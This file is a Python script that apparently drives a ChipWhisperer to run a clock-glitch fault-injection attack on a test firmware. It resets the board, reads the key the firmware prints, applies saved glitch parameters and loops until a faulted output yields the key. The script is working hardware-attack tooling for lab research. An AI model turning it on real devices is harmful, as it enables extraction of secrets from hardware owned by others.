import chipwhisperer as cw
import time
import numpy as np

# Configuration
FW_PATH = "bin/test_glitch.hex"
TARGET_KEY = None

def setup_target():
    try:
        scope = cw.scope()
        target = cw.target(scope)
    except:
        print("Could not connect to ChipWhisperer. Is it busy?")
        return None, None
    
    print("Connecting to ChipWhisperer...")
    scope.default_setup()
    
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "clock_xor"
    scope.glitch.trigger_src = "ext_single"
    scope.io.glitch_lp = True
    scope.io.glitch_hp = True
    
    return scope, target

def read_until(target, term, timeout_ms=1000):
    start = time.time()
    data = ""
    while (time.time() - start) * 1000 < timeout_ms:
        if target.in_waiting():
            chunk = target.read()
            data += chunk
            if term in data:
                return data
    return data if data else None

def reset_target(scope, target):
    scope.io.nrst = 'low'
    time.sleep(0.1)
    scope.io.nrst = 'high'
    time.sleep(0.5)
    target.flush()

def reproduction_attack():
    scope, target = setup_target()
    if not scope: return

    # Skip programming - assume firmware is already flashed
    print("Skipping programming (assuming firmware already on board)...")
    
    # Reset and boot
    print("Resetting target...")
    reset_target(scope, target)
    
    print("Waiting for firmware to boot and generate keys (5 sec)...")
    time.sleep(2)
    
    # Read all available output
    output = ""
    start = time.time()
    while time.time() - start < 5:
        if target.in_waiting():
            output += target.read()
        time.sleep(0.1)
    
    print(f"Firmware Output:\n---\n{output}\n---")
    
    # Extract GOLD key
    global TARGET_KEY
    if "GOLD: " in output:
        idx = output.index("GOLD: ") + 6
        end_idx = output.index("\n", idx) if "\n" in output[idx:] else len(output)
        TARGET_KEY = output[idx:end_idx].strip()
        print(f"\nTarget Key: {TARGET_KEY}")
    else:
        print("Could not find GOLD key in output. Board may need power cycle or reprogramming.")
        scope.dis()
        target.dis()
        return
        
    if not TARGET_KEY or len(TARGET_KEY) < 10:
        print("Invalid target key. Aborting.")
        scope.dis()
        target.dis()
        return

    # Golden Parameters from KYBER_SUCCESS.txt
    scope.glitch.ext_offset = 17
    scope.glitch.width = 4
    scope.glitch.offset = -12
    scope.glitch.repeat = 1
    
    print(f"\n[Attack] Using Golden Parameters: ext=17, width=4, offset=-12")
    print("Starting attack loop (max 5000 attempts)...")
    
    total = 0
    crashes = 0
    successes = 0
    
    while successes == 0 and total < 5000:
        target.flush()
        msg = read_until(target, "WAIT", 500)
        
        if not msg or "WAIT" not in msg:
            crashes += 1
            reset_target(scope, target)
            read_until(target, "WAIT", 2000)
            continue
        
        scope.arm()
        ret = scope.capture()
        
        if ret:
            crashes += 1
            reset_target(scope, target)
            continue
            
        resp = read_until(target, "\n", 500)
        
        if resp and TARGET_KEY in resp:
            successes += 1
            print(f"\n\n[SUCCESS] GLITCH CONFIRMED after {total} attempts!")
            print(f"Recovered Key: {resp.strip()}")
            trace = scope.get_last_trace()
            np.save("traces_repro/golden_success.npy", trace)
            break
        
        total += 1
        if total % 100 == 0:
            print(f"Attempt {total}, Crashes: {crashes}", end="\r")
    
    if successes == 0:
        print(f"\nNo success after {total} attempts ({crashes} crashes).")
    
    scope.dis()
    target.dis()

if __name__ == "__main__":
    reproduction_attack()
